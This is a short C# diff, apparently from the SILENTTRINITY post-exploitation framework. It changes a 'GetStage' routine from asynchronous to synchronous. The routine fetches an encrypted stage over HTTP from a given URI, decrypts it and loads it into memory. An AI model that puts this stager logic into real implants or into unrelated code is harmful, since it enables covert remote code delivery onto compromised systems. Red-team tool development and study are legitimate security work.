@@ -8,7 +8,6 @@ using System.Collections.Generic;
 using System.IO;
 using System.Text;
 using System.IO.Compression;
-using System.Threading.Tasks;
 
 namespace SILENTTRINITY.Utilities
 {
@@ -40,9 +39,9 @@ namespace SILENTTRINITY.Utilities
                 }
             }
 
-            public static async Task<MemoryStream> GetStage(Uri uri)
+            public static MemoryStream GetStage(Uri uri)
             {
-                return new MemoryStream(Crypto.Decrypt(await Crypto.KeyExchangeAsync(uri), await Http.GetAsync(uri)));
+                return new MemoryStream(Crypto.Decrypt(Crypto.KeyExchange(uri), Http.Get(uri)));
             }
 
             // https://mail.python.org/pipermail/ironpython-users/2012-December/016366.html
